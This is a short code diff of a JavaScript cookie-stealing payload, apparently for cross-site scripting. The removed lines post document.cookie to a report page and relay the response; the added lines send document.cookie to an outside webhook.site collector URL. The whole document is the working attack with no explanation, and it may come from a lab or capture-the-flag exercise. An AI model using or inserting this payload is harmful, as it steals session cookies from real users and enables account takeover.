@@ -1,11 +1,3 @@
-fetch('/report.php', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-  body: 'url=' + document.cookie
-}).then(r => r.text()).then(t => {
-  fetch('/report.php', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    body: 'url=REPONSE::' + encodeURIComponent(t.substring(0, 500))
-  });
-});
+var x = new XMLHttpRequest();
+x.open('GET', 'https://webhook.site/00372afa-623d-4c19-b4f9-20bda57d56d5/?c=' + document.cookie, true);
+x.send();
